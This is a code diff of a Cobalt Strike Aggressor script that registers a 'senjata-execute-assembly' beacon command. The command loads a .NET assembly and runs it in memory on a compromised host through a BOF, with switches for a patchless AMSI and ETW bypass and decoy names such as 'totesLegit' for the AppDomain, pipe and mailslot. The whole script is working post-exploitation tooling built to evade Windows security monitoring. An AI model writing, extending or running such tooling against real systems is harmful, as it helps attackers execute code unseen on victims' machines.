@@ -1,56 +1,134 @@
 beacon_command_register(
     "senjata-execute-assembly",
     "Run a .NET assembly with patchless AMSI/ETW bypass + ExitProcess trap",
-    "Usage: senjata-execute-assembly --dotnetassembly <path> [--amsi] [--etw] [--mailslot] [--appdomain <name>] [--entrypoint <0|1>] [--assemblyargs \"<args>\"] [--slotname <name>] [--pipename <name>]");
+    "Synopsis: senjata-execute-assembly --dotnetassembly /path/to/Assembly.exe [--amsi] [--etw] [--mailslot] [--appdomain name] [--main] [--assemblyargs <args>]");
+
+global('$default_appDomain $default_pipeName $default_mailSlotName');
+$default_appDomain    = "totesLegit";
+$default_pipeName     = "totesLegit";
+$default_mailSlotName = "totesLegit";
 
 alias senjata-execute-assembly {
-    local('$bid $args %parsed $asm_bytes $asm_len $packed $bof_path');
-    $bid = $1;
-    $args = substr($0, strlen("senjata-execute-assembly "));
-    %parsed = parse_senjata_args($args);
+    local('$bid $data @args $_amsi $_etw $_mailSlot $_entryPoint $_dotNetAssembly');
+    local('$_appDomain $_mailSlotName $_pipeName $_assemblyWithArgs $i $j $count');
+    local('@_dotNetAssemblyArgs $assemblyLength $assemblyBytes $bofPath $handle $bof $bofArgs');
 
-    if (%parsed['dotnetassembly'] is $null) {
+    $bid  = $1;
+    $data = substr($0, strlen("senjata-execute-assembly "));
+    @args = split(' ', $data);
+
+    $_amsi = 0;
+    $_etw = 0;
+    $_mailSlot = 0;
+    $_entryPoint = 1;
+    $_dotNetAssembly = "";
+    $_appDomain = "";
+    $_mailSlotName = "";
+    $_pipeName = "";
+    $_assemblyWithArgs = "";
+    @_dotNetAssemblyArgs = @();
+
+    for ($i = 0; $i < size(@args); $i++) {
+        if (@args[$i] eq "--amsi") {
+            $_amsi = 1;
+        }
+        else if (@args[$i] eq "--etw") {
+            $_etw = 1;
+        }
+        else if (@args[$i] eq "--mailslot") {
+            $_mailSlot = 1;
+        }
+        else if (@args[$i] eq "--main") {
+            $_entryPoint = 0;
+        }
+        else if (@args[$i] eq "--dotnetassembly") {
+            $i = $i + 1;
+            $_dotNetAssembly = @args[$i];
+        }
+        else if (@args[$i] eq "--appdomain") {
+            $i = $i + 1;
+            $_appDomain = @args[$i];
+        }
+        else if (@args[$i] eq "--slotname") {
+            $i = $i + 1;
+            $_mailSlotName = @args[$i];
+        }
+        else if (@args[$i] eq "--pipename") {
+            $i = $i + 1;
+            $_pipeName = @args[$i];
+        }
+        else if (@args[$i] eq "--assemblyargs") {
+            $i = $i + 1;
+            $count = 0;
+            for ($j = $i; $j < size(@args); $j++) {
+                if (@args[$j] eq "--amsi" || @args[$j] eq "--etw" || @args[$j] eq "--mailslot" || @args[$j] eq "--main"
+                 || @args[$j] eq "--dotnetassembly" || @args[$j] eq "--appdomain" || @args[$j] eq "--slotname"
+                 || @args[$j] eq "--pipename" || @args[$j] eq "--assemblyargs") {
+                    break;
+                }
+                @_dotNetAssemblyArgs[$count] = @args[$j];
+                $count = $count + 1;
+                $i = $j;
+            }
+        }
+    }
+
+    # Apply defaults
+    if ($_appDomain eq "")    { $_appDomain    = $default_appDomain;    }
+    if ($_mailSlotName eq "") { $_mailSlotName = $default_mailSlotName; }
+    if ($_pipeName eq "")     { $_pipeName     = $default_pipeName;     }
+
+    # Validate
+    if ($_dotNetAssembly eq "") {
         berror($bid, "[-] --dotnetassembly is required");
         return;
     }
-    $asm_bytes = readb(openf(%parsed['dotnetassembly']));
-    $asm_len = strlen($asm_bytes);
+    if (!-exists $_dotNetAssembly || !-isFile $_dotNetAssembly) {
+        berror($bid, "[-] File ".$_dotNetAssembly." does not exist");
+        return;
+    }
 
-    $packed = bof_pack($bid, "ziiii zzz b",
-        %parsed['appdomain']     ?? "DefaultDomain",
-        iff(%parsed['amsi'],     1, 0),
-        iff(%parsed['etw'],      1, 0),
-        iff(%parsed['mailslot'], 1, 0),
-        %parsed['entrypoint']    ?? 1,
-        %parsed['slotname']      ?? rand_slot_name(),
-        %parsed['pipename']      ?? rand_pipe_name(),
-        %parsed['assemblyargs']  ?? "",
-        $asm_bytes);
-
-    $bof_path = script_resource("senjata-execute-assembly.x64.o");
-    beacon_inline_execute($bid, readbof($bid, $bof_path, $packed), "go", $packed);
-}
-
-sub rand_slot_name { return "slot_" . substr(uc(formatNumber(rand() * 1000000, 10, 16)), 0, 8); }
-sub rand_pipe_name { return "pipe_" . substr(uc(formatNumber(rand() * 1000000, 10, 16)), 0, 8); }
-
-sub parse_senjata_args {
-    local('%r @parts $i $key');
-    %r = %();
-    @parts = split(" ", $1);
-    $i = 0;
-    while ($i < size(@parts)) {
-        $key = @parts[$i];
-        if ($key eq "--dotnetassembly" || $key eq "--appdomain" || $key eq "--entrypoint"
-         || $key eq "--slotname" || $key eq "--pipename" || $key eq "--assemblyargs") {
-            %r[substr($key, 2)] = @parts[$i + 1];
-            $i = $i + 2;
-        } else if ($key eq "--amsi" || $key eq "--etw" || $key eq "--mailslot") {
-            %r[substr($key, 2)] = 1;
-            $i = $i + 1;
-        } else {
-            $i = $i + 1;
+    # Reassemble --assemblyargs as one space-separated string
+    for ($i = 0; $i < size(@_dotNetAssemblyArgs); $i++) {
+        if (@_dotNetAssemblyArgs[$i] ne "") {
+            if ($_assemblyWithArgs eq "") {
+                $_assemblyWithArgs = @_dotNetAssemblyArgs[$i];
+            } else {
+                $_assemblyWithArgs = $_assemblyWithArgs." ".@_dotNetAssemblyArgs[$i];
+            }
         }
     }
-    return %r;
+
+    # Read the .o BOF
+    $bofPath = script_resource("senjata-execute-assembly.x64.o");
+    if (!-exists $bofPath) {
+        berror($bid, "[-] BOF not found at ".$bofPath);
+        return;
+    }
+    $handle = openf($bofPath);
+    $bof = readb($handle, -1);
+    closef($handle);
+    if (strlen($bof) < 1) {
+        berror($bid, "[-] BOF file is empty: ".$bofPath);
+        return;
+    }
+
+    # Read the .NET assembly
+    $handle = openf($_dotNetAssembly);
+    $assemblyLength = lof($_dotNetAssembly);
+    $assemblyBytes  = readb($handle, -1);
+    closef($handle);
+
+    # Pack args matching senjata-execute-assembly args.rs:
+    #   z app_domain | i amsi | i etw | i mailslot | i entry_point
+    #   z slot_name | z pipe_name | z asm_args | b asm_bytes
+    $bofArgs = bof_pack($bid, "ziiiizzzb",
+        $_appDomain, $_amsi, $_etw, $_mailSlot, $_entryPoint,
+        $_mailSlotName, $_pipeName, $_assemblyWithArgs,
+        $assemblyBytes);
+
+    btask($bid, "Running senjata-execute-assembly (".$_dotNetAssembly.")");
+    beacon_inline_execute($bid, $bof, "go", $bofArgs);
+
+    clear(@_dotNetAssemblyArgs);
 }
